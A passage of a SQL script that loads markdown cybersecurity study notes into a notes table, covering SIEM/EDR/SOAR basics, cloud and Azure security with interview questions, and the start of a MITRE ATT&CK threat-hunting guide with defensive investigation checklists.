| Capability | SIEM | EDR | SOAR |
|-----------|------|-----|------|
| Log Collection | ✅ All sources | ✅ Endpoints only | ❌ |
| Correlation | ✅ Cross-source | ✅ Endpoint events | ❌ |
| Detection | ✅ Rule-based | ✅ Behavioral + ML | ❌ |
| Investigation | ✅ Log search | ✅ Endpoint forensics | ❌ |
| Automated Response | ⚠️ Limited | ✅ Endpoint actions | ✅ Full automation |
| Orchestration | ❌ | ❌ | ✅ Multi-tool |
| Playbooks | ❌ | ⚠️ Basic | ✅ Advanced |

### Vulnerability Severity & Response

| CVSS | Severity | Target Response Time |
|------|----------|---------------------|
| 9.0-10.0 | Critical | Immediate (24-48 hrs) |
| 7.0-8.9 | High | 7 days |
| 4.0-6.9 | Medium | 30 days |
| 0.1-3.9 | Low | 90 days |

### Threat Hunting Maturity Model

| Level | Description |
|-------|-------------|
| **Level 0** | No hunting — purely alert-driven |
| **Level 1** | Ad-hoc — occasional, unstructured hunting |
| **Level 2** | Procedural — following documented hunting procedures |
| **Level 3** | Innovative — creating custom analytics, hypothesis-driven |
| **Level 4** | Leading — automated hunting, ML-based, sharing intel with community |

---

## 10. Key Takeaways

1. ✅ **SIEM** = Central log collection + correlation + alerting (macro view)
2. ✅ **EDR** = Endpoint monitoring + behavioral detection + response (micro view)
3. ✅ **SOAR** = Automation + orchestration + playbooks (force multiplier)
4. ✅ EDR detects **fileless malware** and **unknown threats** that AV misses
5. ✅ **SOAR playbooks** reduce response time from hours to minutes
6. ✅ **Vulnerability Management** = Continuous cycle: Discover → Scan → Assess → Prioritize → Remediate → Verify
7. ✅ **CVSS** scores range 0-10; Critical (9-10) = patch immediately
8. ✅ **Threat Hunting** is PROACTIVE and HYPOTHESIS-driven (not waiting for alerts)
9. ✅ Map hunting to **MITRE ATT&CK** for structured coverage
10. ✅ **BYOD** requires MDM, containerization, VPN, and network segmentation

---

> 📌 **Previous:** [Part 6: SOC Analyst Interview Scenarios](./Study_Guide_Part6_SOC_Analyst_Interview_Scenarios.md)  
> 📌 **Next:** [Part 8: Cloud Security & Azure](./Study_Guide_Part8_Cloud_Security_Azure.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Study_Guide_Part8_Cloud_Security_Azure$VELSEC$, $VELSEC$Study Guide Part8 Cloud Security Azure$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 📘 Part 8: Cloud Security & Azure

> **Comprehensive Interview Study Guide** — Based on real cybersecurity course transcripts  
> Covers: Cloud Service Models (IaaS/PaaS/SaaS), Shared Responsibility, Cloud Characteristics, Container Security, Shadow IT, Insider Threats, Azure Network Security, AKS, Azure SQL Backup

---

## Table of Contents

1. [Cloud Computing Fundamentals](#1-cloud-computing-fundamentals)
2. [Shared Responsibility Model](#2-shared-responsibility-model)
3. [Container Security (Docker & Kubernetes)](#3-container-security-docker--kubernetes)
4. [Shadow IT & Insider Threats in Cloud](#4-shadow-it--insider-threats-in-cloud)
5. [Managing Multiple Cloud Environments](#5-managing-multiple-cloud-environments)
6. [Network Segmentation in Cloud](#6-network-segmentation-in-cloud)
7. [Azure Specifics: Network Security & Micro-segmentation](#7-azure-specifics-network-security--micro-segmentation)
8. [Azure Kubernetes Service (AKS) Architecture](#8-azure-kubernetes-service-aks-architecture)
9. [Interview Questions & Answers](#9-interview-questions--answers)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Cloud Computing Fundamentals

### Key Characteristics (NIST 800-145)
1. **On-Demand Self-Service:** Rapidly provision resources (VMS, storage) without interacting with the provider. 
   - *Risk:* Shadow IT and lack of governance.
2. **Broad Network Access:** Access resources from anywhere, on any device over the internet.
   - *Risk:* BYOD security challenges, complicated compliance.
3. **Resource Pooling & Multi-tenancy:** Cloud provider pools resources to serve multiple consumers simultaneously.
   - *Risk:* Information leakage between tenants, resource exhaustion by "noisy neighbors," complex auditing.
4. **Rapid Elasticity:** Automatically scale resources up/down (vertical) or in/out (horizontal) based on demand.
   - *Risk:* Abuse of cloud services (e.g., DDoS triggering massive resource allocation and huge bills).
5. **Measured Service:** "Pay-as-you-go" billing based only on what is used.

### Cloud Service Models

| Model | What Provider Manages | What Consumer Manages | Common Use Case |
|-------|-----------------------|-----------------------|-----------------|
| **IaaS** | Hardware, Networking, Virtualization | OS, Middleware, Runtime, App, Data | BCDR, Storage, VMs |
| **PaaS** | IaaS + OS, Middleware, Runtime | Application, Data | Software Development |
| **SaaS** | PaaS + Application | Data (upload & process) | Gmail, Office 365, Salesforce |

---

## 2. Shared Responsibility Model

Security in the cloud is shared between the **Cloud Service Provider (CSP)** and the **Cloud Consumer**. 

- **Physical Security (Hardware, Datacenter):** ALWAYS the CSP's responsibility.
- **Information/Data Security:** ALWAYS the Consumer's responsibility.

### Where the risks lie (The "Ambiguous" Areas):
- **IaaS:** Infrastructure security (virtualization) is shared. Consumer manages OS security.
- **PaaS:** Platform security is shared. Consumer manages App security.
- **SaaS:** Application configuration is shared.

> **Key Rule:** The shared areas present the highest risk. SLAs must explicitly define who does what to ensure there are no security gaps.

---

## 3. Container Security (Docker & Kubernetes)

Securing containerized apps requires multiple layers of defense throughout the lifecycle.

### 1. Image Security
- Scan images for vulnerabilities before deployment
- Use signed, minimal, and secure base images
- Store images in a private, scanned Container Registry

### 2. Configuration & Runtime Security
- Run containers with **least privilege** (avoid running as `root`)
- Set resource limits (CPU/Memory) to prevent DoS via exhaustion
- Use a **read-only file system** where possible
- Monitor runtime behavior for anomalies

### 3. Network & Orchestration Security (Kubernetes)
- **Network Policies:** Limit communication between pods (micro-segmentation)
- **RBAC:** Restrict access to the Kubernetes API based on user roles
- **Namespaces:** Isolate different environments (Dev/Test/Prod)
- **Secrets Management:** Use HashiCorp Vault or K8s Secrets — **NEVER hardcode secrets in ENV variables**

---

## 4. Shadow IT & Insider Threats in Cloud

### Managing Shadow IT
Shadow IT is the use of unauthorized cloud services by employees.
- **Detect:** Monitor network traffic, use a **CASB (Cloud Access Security Broker)**, endpoint security tools, and review proxy logs.
- **Manage:** Create clear policies on approved tools, streamline the approval process for new tools, block unapproved services at the network level, and educate employees.

### Mitigating Insider Threats
- Enforce **Least Privilege** and strict **RBAC**.
- Require **MFA** for all access.
- Use **UBA (User Behavior Analytics)** to establish a baseline of normal behavior and detect anomalies (e.g., massive data downloads at 3 AM).
- Implement **DLP (Data Loss Prevention)** to prevent sensitive data exfiltration.
- Segregate duties so no single person has complete control over critical systems.

---

## 5. Managing Multiple Cloud Environments

When an organization uses multi-cloud (AWS, Azure, GCP), consistent security is critical.
- **Centralized Policies:** Write policies that apply universally.
- **IaC (Infrastructure as Code):** Use tools like Terraform to deploy infrastructure consistently across platforms. Store templates in Git.
- **Federated Identity:** Use SSO to unify access management.
- **Centralized Logging:** Forward logs from all clouds to a single SIEM (e.g., Splunk).
- **Consistent DLP & Encryption:** Apply the same data protection rules everywhere and manage keys centrally.

---

## 6. Network Segmentation in Cloud

Dividing the cloud network into isolated segments limits the "blast radius" of a breach.

### General Approach:
1. Create different **VPCs / VNETs** for Dev, Test, and Prod.
2. Within a VPC, create **Subnets** for different tiers (Web, App, DB).
3. Use **Security Groups / NSGs** to apply micro-segmentation at the instance level.

### Public Cloud Tools:
- **AWS:** VPC, Transit Gateway, Security Groups, Network ACLs, PrivateLink
- **Azure:** VNet, Network Security Groups (NSGs), Application Security Groups (ASGs), VNet Peering
- **GCP:** VPC, Firewall Rules, Cloud Interconnect

---

## 7. Azure Specifics: Network Security & Micro-segmentation

### Azure Virtual Networks (VNet) Architecture
- **Connectivity:** Use ExpressRoute for dedicated, low-latency on-prem connection, or VPN Gateway.
- **Traffic Routing:** Azure Traffic Manager (Global), Azure Load Balancer (Regional), Application Gateway (Layer 7 / WAF).
- **Availability:** Use Availability Sets/Zones.

### NSGs and ASGs (Micro-segmentation)
- **NSGs (Network Security Groups):** Layer 4 stateful packet filters (allow/deny based on IP, port, protocol). They follow a default deny model and process rules by priority number (lower number = higher priority).
- **ASGs (Application Security Groups):** Allow grouping of VMs based on their role (e.g., "WebServers", "DBServers") rather than managing individual IPs. 
- **How they work together:** You assign VMs to an ASG, and then use that ASG as the source/destination in an NSG rule. This makes NSG rules dynamic and much easier to manage.

### Azure SQL Database Backup Strategy
- **Automated Backups:** Full, differential, and transaction log backups. Offers Point-in-Time Restore (PITR).
- **Long-term Retention:** Azure Backup can retain backups for up to 10 years in Geo-Redundant Storage (GRS).
- **Geo-Restore:** Restore a database to a different Azure region for Disaster Recovery.

---

## 8. Azure Kubernetes Service (AKS) Architecture

Designing a secure, scalable AKS cluster involves:

### Networking
- **Azure CNI:** Gives each Pod an IP address from the Azure VNet for secure integration.
- **Private Link:** Secure access to other Azure services without exposing them to the internet.
- **Network Policies:** Control pod-to-pod communication.

### Security
- **RBAC & Microsoft Entra ID (formerly Azure AD):** For user authentication.
- **Azure AD Pod Identity / Workload Identity:** Allows pods to securely access Azure services using managed identities instead of embedded credentials.
- **Microsoft Defender for Cloud:** Continuous security monitoring.
- **Azure Container Registry (ACR):** Store images and scan them for vulnerabilities.

### Scalability
- **HPA (Horizontal Pod Autoscaler):** Scales the number of pods based on CPU/metrics.
- **Cluster Autoscaler:** Scales the underlying VMs (nodes) when pods need more resources.

---

## 9. Interview Questions & Answers

### Q1: Explain the Shared Responsibility Model.
**A:** In cloud computing, security is a shared partnership. The Cloud Provider is ALWAYS responsible for the physical security of the datacenter and hardware. The Consumer is ALWAYS responsible for their data and access management. The areas in between (OS, network controls, platform configurations) depend on the service model (IaaS vs PaaS vs SaaS). The most risk lies in the ambiguous shared areas, which must be clearly defined in SLAs.

### Q2: What is the difference between scaling up and scaling out?
**A:** Scaling UP (vertical scaling) means adding more power (CPU, RAM) to an existing virtual machine. Scaling OUT (horizontal scaling) means adding more instances (more VMs) to handle the load. Cloud environments heavily favor horizontal scaling out (via Auto Scaling Groups / VMSS) for high availability and rapid elasticity.

### Q3: How do you secure a CI/CD pipeline?
**A:** (1) Secure the source code repository with strong access controls and require code reviews. (2) Use minimal, secure Docker images for build agents. (3) NEVER hardcode secrets; use a vault like Azure Key Vault or AWS Secrets Manager. (4) Integrate security testing: SAST, DAST, and dependency scanning. (5) Sign artifacts to ensure integrity before deployment.

### Q4: Explain how NSGs and ASGs work together in Azure for micro-segmentation.
**A:** NSGs are stateful firewalls that filter traffic based on IP, port, and protocol. ASGs allow you to group VMs logically by function (e.g., "WebTier" or "DbTier") without worrying about their IP addresses. Instead of writing complex NSG rules with dozens of IPs, you write a simple NSG rule that says "Allow traffic from WebTier ASG to DbTier ASG on Port 1433". If a new VM is added to the DbTier ASG, the NSG rule automatically applies to it.

### Q5: What is Shadow IT and how do you handle it?
**A:** Shadow IT is when employees use unauthorized cloud applications without IT's knowledge. I handle it through detection (monitoring network traffic, using a CASB to find unsanctioned apps), policy enforcement (blocking unapproved apps at the firewall/proxy), and education (training users). Importantly, I also streamline the IT approval process so employees don't feel the need to bypass IT.

### Q6: How do you design an auto-scaling architecture in Azure?
**A:** Use Azure Virtual Machine Scale Sets (VMSS) to manage a group of identical VMs. Place the VMSS behind an Azure Load Balancer or Application Gateway. Define autoscaling policies based on metrics (e.g., scale out when CPU > 75%, scale in when CPU < 25%). Ensure the application is stateless so new instances can be added/removed without disrupting user sessions. Place instances across Availability Zones for high availability.

---

## 10. Key Takeaways

1. ✅ **5 Cloud Characteristics:** On-demand, Broad network access, Resource pooling, Rapid elasticity, Measured service.
2. ✅ **Shared Responsibility:** Provider secures the physical cloud; Consumer secures what's IN the cloud.
3. ✅ **Container Security:** Don't run as root, set resource limits, use read-only filesystems, don't hardcode secrets.
4. ✅ **CASB (Cloud Access Security Broker):** The primary tool for detecting and managing Shadow IT.
5. ✅ **Insider Threats:** Best mitigated by UBA (User Behavior Analytics), Least Privilege, and strict Logging.
6. ✅ **Multi-Cloud Security:** Use centralized IaC (Terraform), SSO, and forward all logs to one central SIEM.
7. ✅ **Network Segmentation:** Use VPCs/VNets, Subnets, and Security Groups to isolate application tiers.
8. ✅ **Azure ASGs:** Simplify NSG rule management by grouping VMs by role instead of IP address.
9. ✅ **AKS Scalability:** HPA scales the pods; Cluster Autoscaler scales the nodes.

---

> 📌 **Previous:** [Part 7: Security Tools — SIEM, EDR, SOAR](./Study_Guide_Part7_Security_Tools_SIEM_EDR_SOAR.md)  
> 📌 **End of Study Guide.** Return to [Master Index](./Study_Guide_Master_Index.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Threat_Hunting_SOC_Guide_Comprehensive$VELSEC$, $VELSEC$Threat Hunting Soc Guide Comprehensive$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['SOC']::TEXT[], $VELSEC$# 🎯 Threat Hunting SOC Guide — Part 1: MITRE ATT&CK Framework, Methodologies & Tactics (Recon → Execution)

---

# PART 1: THREAT HUNTING FUNDAMENTALS & MITRE ATT&CK MAPPED INVESTIGATIONS

---

## 1. What Is Threat Hunting?

### 1.1 Definition

Threat hunting is the **proactive, hypothesis-driven** process of searching through networks, endpoints, and datasets to detect threats that evade existing automated security solutions (SIEM rules, EDR signatures, IDS/IPS). Unlike reactive SOC operations (alert triage), threat hunting **assumes compromise** and actively looks for evidence of adversary activity.

### 1.2 Threat Hunting vs. Alert Triage

| Aspect | Alert Triage (Reactive) | Threat Hunting (Proactive) |
|--------|------------------------|---------------------------|
| **Trigger** | Automated alert fires | Hypothesis or intelligence-driven |
| **Approach** | Investigate what the system detected | Search for what the system **missed** |
| **Mindset** | "Is this alert real?" | "What threats are hiding in our environment?" |
| **Scope** | Single alert/event | Environment-wide or campaign-focused |
| **Output** | TP/FP verdict + response | New detections, IOCs, improved visibility |
| **Frequency** | Continuous (as alerts come in) | Scheduled or triggered by intel |
| **Skill Level** | L1-L2 SOC Analysts | L2-L3 Analysts, Threat Hunters |
| **Tools** | SIEM, EDR alerts | SIEM queries, EDR telemetry, threat intel, custom scripts |

### 1.3 The Three Hunting Models

```
┌──────────────────────────────────────────────────────────────────────┐
│                    THREAT HUNTING MODELS                              │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. INTEL-DRIVEN (Reactive Hunting)                                  │
│     ├─ Triggered by: New threat intelligence (IOCs, reports, CVEs)   │
│     ├─ Method: Search for known IOCs across environment              │
│     ├─ Example: New APT report → search for their known C2 IPs      │
│     └─ Maturity Level: Beginner                                     │
│                                                                      │
│  2. HYPOTHESIS-DRIVEN (Proactive Hunting)                            │
│     ├─ Triggered by: Analyst intuition + MITRE ATT&CK knowledge     │
│     ├─ Method: Formulate hypothesis → test against data             │
│     ├─ Example: "Attackers may be using LOLBins for lateral movement"│
│     └─ Maturity Level: Intermediate                                  │
│                                                                      │
│  3. DATA-DRIVEN (Analytics-Based)                                    │
│     ├─ Triggered by: Statistical anomalies in baseline data          │
│     ├─ Method: Machine learning, baselining, outlier detection       │
│     ├─ Example: Anomalous DNS query volume from a single host        │
│     └─ Maturity Level: Advanced                                      │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 2. MITRE ATT&CK Framework — Overview for Threat Hunters

### 2.1 What Is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary behavior based on real-world observations. It categorizes **what** adversaries do (Tactics), **how** they do it (Techniques), and specific **implementations** (Sub-techniques/Procedures).

### 2.2 ATT&CK Matrix Structure

```
┌───────────────────────────────────────────────────────────────────────────┐
│                        MITRE ATT&CK ENTERPRISE MATRIX                     │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│   TACTICS (WHY — the adversary's goal)                                    │
│   └─ TECHNIQUES (HOW — the method used to achieve the goal)              │
│       └─ SUB-TECHNIQUES (SPECIFIC — variation of the technique)          │
│           └─ PROCEDURES (IMPLEMENTATION — real-world group usage)         │
│                                                                           │
│   Example:                                                                │
│   Tactic:         Credential Access                                       │
│   Technique:      OS Credential Dumping (T1003)                          │
│   Sub-Technique:  LSASS Memory (T1003.001)                               │
│   Procedure:      APT28 uses Mimikatz to dump LSASS credentials         │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

### 2.3 The 14 ATT&CK Tactics (Enterprise)

| # | Tactic ID | Tactic | Goal | Key Techniques |
|---|-----------|--------|------|----------------|
| 1 | TA0043 | **Reconnaissance** | Gather info for planning | Active/Passive scanning, Phishing for info |
| 2 | TA0042 | **Resource Development** | Establish resources for operations | Acquire infrastructure, Develop capabilities |
| 3 | TA0001 | **Initial Access** | Get into the network | Phishing, Exploit public-facing app, Valid accounts |
| 4 | TA0002 | **Execution** | Run malicious code | PowerShell, WMI, Scripting, Scheduled tasks |
| 5 | TA0003 | **Persistence** | Maintain foothold | Registry Run keys, Scheduled tasks, Account creation |
| 6 | TA0004 | **Privilege Escalation** | Gain higher-level permissions | Token manipulation, Exploitation, UAC bypass |
| 7 | TA0005 | **Defense Evasion** | Avoid detection | Obfuscation, Disabling security, Masquerading |
| 8 | TA0006 | **Credential Access** | Steal credentials | Credential dumping, Keylogging, Brute force |
| 9 | TA0007 | **Discovery** | Explore the environment | Network scanning, Account discovery, System info |
| 10 | TA0008 | **Lateral Movement** | Move through the environment | RDP, SMB, PsExec, WinRM |
| 11 | TA0009 | **Collection** | Gather target data | Screen capture, Keylogging, Email collection |
| 12 | TA0011 | **Command and Control** | Communicate with implants | DNS tunneling, HTTPS C2, Domain fronting |
| 13 | TA0010 | **Exfiltration** | Steal data out | Exfil over C2, Exfil to cloud, Scheduled transfer |
| 14 | TA0040 | **Impact** | Disrupt/Destroy | Ransomware, Data destruction, Defacement |

### 2.4 How Threat Hunters Use MITRE ATT&CK

```
┌──────────────────────────────────────────────────────────────────────┐
│           MITRE ATT&CK FOR THREAT HUNTING WORKFLOW                   │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. MAP DETECTION COVERAGE                                           │
│     ├─ Overlay your SIEM/EDR detections on ATT&CK Matrix            │
│     ├─ Identify GAPS (tactics/techniques with NO detection)          │
│     └─ Prioritize hunting in unmonitored areas                       │
│                                                                      │
│  2. FORMULATE HUNTING HYPOTHESES                                     │
│     ├─ Pick a tactic/technique relevant to your threat model        │
│     ├─ "If adversary does T1059.001 (PowerShell), what traces?"     │
│     └─ Design queries to find those traces                           │
│                                                                      │
│  3. INVESTIGATE RESULTS                                              │
│     ├─ Analyze returned data for true adversary behavior             │
│     ├─ Eliminate false positives (system admins, automation)         │
│     └─ Correlate findings with other tactics in kill chain          │
│                                                                      │
│  4. CREATE / IMPROVE DETECTIONS                                      │
│     ├─ Convert hunting findings into automated SIEM rules           │
│     ├─ Write Sigma rules or KQL queries                              │
│     └─ Document in detection engineering backlog                     │
│                                                                      │
│  5. REPORT & ITERATE                                                 │
│     ├─ Document hunting results (positive or negative)              │
│     ├─ Share IOCs and TTPs with SOC and threat intel team            │
│     └─ Update threat model and repeat cycle                          │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. Threat Hunting Process — Step by Step

### 3.1 The Hunting Cycle

```
    ┌──────────────┐
    │  1. CREATE    │◄────────────────────────────────┐
    │  HYPOTHESIS   │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 2. GATHER    │                                  │
    │ DATA/LOGS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 3. RUN       │                                  │
    │ ANALYTICS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐         ┌──────────────┐        │
    │ 4. ANALYZE   │────────►│ 5. FINDINGS? │        │
    │ RESULTS      │         │              │        │
    └──────────────┘         └──────┬───────┘        │
                                    │                 │
                              YES   │   NO            │
                               │    │    │            │
                               ▼    │    ▼            │
                         ┌─────────┐│ ┌─────────┐    │
                         │ CREATE  ││ │ REFINE   │    │
                         │ DETECT/ ││ │ HYPOTHESIS│────┘
                         │ RESPOND ││ │ & QUERY  │
                         └─────────┘│ └─────────┘
                                    │
                               ▼    │
                         ┌─────────┐
                         │DOCUMENT │
                         │& SHARE  │
                         └─────────┘
```

### 3.2 Hypothesis Construction Framework

| Component | Description | Example |
|-----------|-------------|---------|
| **Threat Actor** | Who might attack us? | APT29; Ransomware gang; Insider threat |
| **Tactic** | What is their goal? | Persistence; Credential Access |
| **Technique** | How would they achieve it? | T1053 - Scheduled Task; T1003 - Credential Dumping |
| **Data Source** | What logs show this behavior? | Windows Event Logs, EDR telemetry, Sysmon |
| **Expected Evidence** | What would we see in the data? | New scheduled tasks created by non-admin users |
| **Baseline** | What is normal? | IT admin creates scheduled tasks for patching |

**Example Hypothesis:**
> "An adversary may have established persistence in our environment by creating scheduled tasks (T1053.005) to execute malicious payloads. I will search for recently created scheduled tasks by non-standard accounts, created outside of change windows, pointing to unusual binary paths."

### 3.3 Key Data Sources for Hunting

| Data Source | What It Captures | Key Event IDs / Logs |
|-------------|-----------------|---------------------|
| **Windows Event Logs** | Authentication, process execution, PowerShell | 4624, 4625, 4688, 4672, 4720, 4732, 7045 |
| **Sysmon** | Process creation, network connections, file creation | Event 1 (Process Create), 3 (Network), 7 (Image Loaded), 11 (File Create), 13 (Registry) |
| **EDR Telemetry** | Endpoint behavior, process trees, file modifications | CrowdStrike, Defender for Endpoint, SentinelOne |
| **Firewall/Proxy Logs** | Network connections, URL requests, blocked traffic | Connection logs, URL filtering logs |
| **DNS Logs** | Domain resolution queries | Query logs, response logs |
| **Cloud Logs** | Azure AD/Entra, AWS CloudTrail, GCP Audit | Sign-in logs, API calls, IAM changes |
| **Email Logs** | Email flow, attachments, URL clicks | Exchange message trace, SEG logs |
| **Network Flow** | NetFlow/IPFIX data, packet captures | Source/Dest IP, ports, bytes, duration |

---

## 4. MITRE ATT&CK Tactic-by-Tactic Hunting Guide

### 4.1 TA0043 — Reconnaissance

#### Overview
Adversaries gather information about the target before attacking. While most recon happens externally (outside your network), you can detect **active reconnaissance** like port scanning and responses to information-gathering emails.

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1595 | Active Scanning | Port scanning, vulnerability scanning from external IPs |
| T1589 | Gather Victim Identity Info | Harvesting employee names, emails, credentials from public sources |
| T1590 | Gather Victim Network Info | Identifying IP ranges, domains, DNS records |
| T1591 | Gather Victim Org Info | Business relationships, physical locations, roles |
| T1598 | Phishing for Information | Spear-phishing emails designed to gather intel (not deliver malware) |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| External port scanning | Firewall/IDS | High volume of connection attempts from single external IP to multiple ports |
| Reconnaissance phishing | Email gateway | Emails requesting org chart, contact info, technology stack details |
| Web scraping of public assets | Web server logs | Unusual crawling patterns on career pages, leadership pages |
| DNS reconnaissance | DNS logs | High volume of DNS queries for subdomains from external source (subdomain enumeration) |

#### ✅ True Positive Scenario — Active Scanning Detected

**Scenario:** Firewall logs show an external IP (`185.220.101.x`) sent SYN packets to 500+ ports on your DMZ server within 5 minutes.

**Investigation Steps:**
```
1. CONFIRM THE ACTIVITY
   □ Review firewall logs for the source IP
   □ Confirm high port-scan volume (> 100 ports in < 10 min)
   □ Identify targeted assets (what servers/ranges were scanned)

2. ENRICH THE SOURCE IP
   □ Check AbuseIPDB, VirusTotal, Shodan for source IP reputation
   □ Check if IP belongs to known threat actor infrastructure
   □ Check if IP is a TOR exit node or VPN provider
   □ Geolocate the IP

3. ASSESS IMPACT
   □ Were any ports open/responsive?
   □ Did the scanner find any vulnerable services?
   □ Were there follow-up exploitation attempts?
   □ Check IDS/IPS for signature-based alerts from same IP

4. RESPOND
   □ Block the source IP at perimeter firewall
   □ Add IP to threat intel watchlist
   □ Notify vulnerability management team of scanned assets
   □ Verify patch status of exposed services
   □ Monitor for follow-up activity from same IP range

5. DOCUMENT
   □ Log finding in threat hunting report
   □ Create SIEM correlation rule for future scans from this range
   □ Update threat model with targeting information
```

**TP Confidence:** 🔴 HIGH — External entity actively scanning your infrastructure is always a TP for reconnaissance.

---

### 4.2 TA0042 — Resource Development

#### Overview
Adversaries establish infrastructure, acquire tools, and prepare capabilities before the attack. This tactic is **mostly undetectable** from within the target's environment but can be observed through:
- Newly registered domains mimicking your brand
- Infrastructure associated with known threat actors

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1583 | Acquire Infrastructure | Register domains, rent VPS, buy IP ranges |
| T1584 | Compromise Infrastructure | Hack legitimate servers for C2 |
| T1587 | Develop Capabilities | Build custom malware, exploits |
| T1588 | Obtain Capabilities | Download tools like Cobalt Strike, Mimikatz |
| T1585 | Establish Accounts | Create accounts for social engineering |
| T1586 | Compromise Accounts | Take over legitimate accounts for use in ops |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Lookalike domains | Domain monitoring service | Newly registered domains similar to your brand name (typosquats, homoglyphs) |
| Staged tools/payloads | Threat intel feeds | Known malicious tools hosted on infrastructure matching your threat model |
| Compromised infrastructure | Passive DNS | Legitimate domains suddenly resolving to suspicious IPs |

#### ✅ True Positive Scenario — Lookalike Domain Registered

**Scenario:** Domain monitoring service alerts that `yourcompany-login.com` was registered 2 days ago. Passive DNS shows it resolves to a known bulletproof hosting provider.

**Investigation Steps:**
```
1. CONFIRM THE DOMAIN
   □ WHOIS lookup: registrar, registrant (often privacy-protected), creation date
   □ Passive DNS: what IPs does it resolve to?
   □ Check if the domain has MX records (email-capable)
   □ Check if a website is hosted (credential harvesting page?)

2. ASSESS RISK
   □ Does the domain mimic your login portal?
   □ Is MX configured to send/receive email (BEC risk)?
   □ Has it been used in phishing campaigns already?
   □ Check URLScan.io for any captures of the domain

3. RESPOND
   □ Submit takedown request to registrar
   □ Add domain to email gateway and web proxy blocklists
   □ Create SIEM alert for any internal connections to this domain
   □ Notify phishing awareness team
   □ Check if any employees have already visited this domain (proxy logs)

4. PROACTIVE
   □ Acquire similar variations yourself (defensive registration)
   □ Set up ongoing monitoring for brand-impersonating domains
```

**TP Confidence:** 🔴 HIGH — Lookalike domain targeting your org with active infrastructure is confirmed resource development.

---

### 4.3 TA0001 — Initial Access

#### Overview
Adversaries use various methods to gain initial foothold in the target network. This is where most attacks become **detectable by SOC teams**.

#### Key Techniques

| Technique ID | Technique | Description | Common Detection Source |
|-------------|-----------|-------------|------------------------|
| T1566 | Phishing | Spear-phishing emails with links/attachments | Email gateway, SIEM |
| T1566.001 | Phishing: Attachment | Malicious file attached to email | Email gateway, EDR |
| T1566.002 | Phishing: Link | Malicious URL in email body | Email gateway, Proxy |
| T1190 | Exploit Public-Facing App | Exploit vulnerabilities in web apps, VPN, RDP | WAF, IDS/IPS, App logs |
| T1133 | External Remote Services | Abuse VPN, RDP, Citrix for access | Auth logs, VPN logs |
| T1078 | Valid Accounts | Use stolen/compromised credentials | Auth logs, UEBA |
| T1199 | Trusted Relationship | Abuse supply chain / partner connections | Network logs, Auth logs |
| T1195 | Supply Chain Compromise | Compromise software supply chain | Endpoint, Integrity monitoring |
| T1189 | Drive-by Compromise | Exploit browser via compromised website | Proxy, EDR, IDS |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Phishing delivery | Email logs | Emails with suspicious attachments (.iso, .img, .lnk, .hta, .vbs) from external senders |
| Exploitation attempts | WAF/IDS logs | SQL injection, path traversal, RCE attempts against public apps |
| Credential stuffing | Auth logs | High volume of failed logins from single IP/IP range against multiple accounts |
| VPN brute force | VPN logs | Repeated authentication failures → eventual success |
| Compromised credentials | SIEM/UEBA | Successful login from unusual geo, impossible travel, new device+location |
| Supply chain | EDR | Signed software executing unexpected child processes |

#### ✅ True Positive Scenario — Phishing with Malicious Attachment (T1566.001)

**Scenario:** SEG quarantined an email with a `.iso` file attached. Subject: "Q4 Financial Review — URGENT". Sender domain `finance-reports-2024.com` was registered 3 days ago.

**Investigation Steps:**
```
1. EMAIL ANALYSIS
   □ Full header analysis: Return-Path, X-Originating-IP, auth results
   □ WHOIS on sender domain: age < 30 days → 🔴
   □ SPF/DKIM/DMARC status → likely all fail
   □ Check if email reached any mailboxes (bypass quarantine?)

2. ATTACHMENT ANALYSIS
   □ Calculate file hash (SHA256)
   □ Check hash on VirusTotal → any detections?
   □ Submit to sandbox (Any.Run, Hybrid Analysis)
   □ Mount the .iso → what files are inside? (.lnk? .exe? .dll?)
   □ Check for hidden files, double extensions
   □ Analyze any scripts/macros inside

3. SCOPE ASSESSMENT
   □ How many recipients received this email?
   □ Search for similar subject lines, sender domains, attachment hashes
   □ Check if any user interacted (clicked, opened, mounted)
   □ If mounted: check EDR for child process execution

4. RESPOND (if TP confirmed)
   □ Purge email from all mailboxes
   □ Block sender domain and IP at email gateway
   □ Block attachment hash at EDR
   □ If user interacted: isolate endpoint, initiate IR
   □ Submit IOCs to threat intel platform
   □ Alert organization with phishing advisory

5. DETECTION IMPROVEMENT
   □ Create/tune rule for .iso attachment detection
   □ Add domain to blocklist
   □ Review and strengthen attachment filtering policies
```

**TP Confidence:** 🔴 HIGH — New domain + weaponized attachment + urgency language + financial lure = confirmed phishing.

#### ✅ True Positive Scenario — Valid Accounts (T1078) — Compromised Credentials

